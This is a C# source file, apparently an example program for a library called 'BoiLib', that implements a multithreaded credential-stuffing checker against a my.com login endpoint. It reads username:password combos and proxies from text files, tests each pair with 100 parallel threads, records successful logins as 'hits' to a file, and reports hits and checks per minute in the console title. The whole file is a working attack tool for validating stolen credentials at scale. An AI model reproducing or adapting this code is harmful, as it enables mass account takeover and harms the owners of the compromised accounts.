using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BoiLib;
using Leaf.xNet;
using System.Threading;
using System.IO;
using Console = Colorful.Console;
using System.Drawing;

namespace BoiLib_Example
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "BoiLib";
            BoiLib_Basic_Utils.LoadData("combos.txt", "proxies.txt"); 
            BoiLib_Basic_Utils.SetThreads(100); 
            BoiLib_Basic_Utils.SetProxyType(ProxyType.HTTP); 
            new Thread(() => Title()).Start(); 
            ThreadPool.SetMinThreads(Variables.Threads, Variables.Threads);
            Parallel.ForEach(Variables.Combos, new ParallelOptions
            {
                MaxDegreeOfParallelism = Variables.Threads
            }, delegate (string ComboLine)
            {
                worker(ComboLine);
            });

            Console.WriteLine("Finished."); 
            Console.ReadKey();
            Environment.Exit(0);
        }
        static void worker(string line)
        {
                string[] array = line.Split(':');
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        BoiLib_Basic_Utils.SetProxySettings(req); 
                        string check = req.Post("https://aj-https.my.com/cgi-bin/auth", new FormUrlEncodedContent(new Dictionary<string, string>()
                  {
                    { "Login", array[0] },
                    { "Password", array[1]},
                    { "simple", "1" }
                })).ToString();
                  
                        if (check.Contains("Ok=0"))
                        {
                            Interlocked.Increment(ref Variables.Invalids);
                            Interlocked.Increment(ref Variables.Checked);
                            Interlocked.Increment(ref Variables.CPM);
                        }
                        else if (check.Contains("Ok=1")) 
                        {
                            Interlocked.Increment(ref Variables.Hit);
                            Interlocked.Increment(ref Variables.Checked);
                            Interlocked.Increment(ref Variables.CPM);

                            Console.WriteLine(line , Color.Green);
                            File.WriteAllText("Hits.txt", line + Environment.NewLine);

                        }
                        else
                        {
                         
                        if (Variables.Counter == 10) 
                        {
                            Variables.Counter = Variables.Counter - 0; 
                            Interlocked.Increment(ref Variables.Retries);
                            File.WriteAllText("Errors.txt", line + Environment.NewLine);
                        }
                        else
                        {
                            Interlocked.Increment(ref Variables.Retries);
                            HandleRetries(line);
                        }
                           
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Variables.Retries);
                    HandleRetries(line);
                }
            
          
        }
        static void HandleRetries(string line)
        {
            worker(line); 
        }
        static void Title()
        {
            while (true)
            {
                Console.Title = new StringBuilder("BoiLib Example by YoBoi")
                .Append($" - Checked: {Variables.Checked}/{Variables.Combos.Length}")
                .Append($" - Hits: {Variables.Hit}")
                .Append($" - Invalids: {Variables.Invalids}")
                .Append($" - Retries: {Variables.Retries}")
                .Append($" - CPM: {Variables.CPM*60}")
                .ToString();
                Variables.CPM = 0;
                Thread.Sleep(1000);
                
            }
        }
    }
}
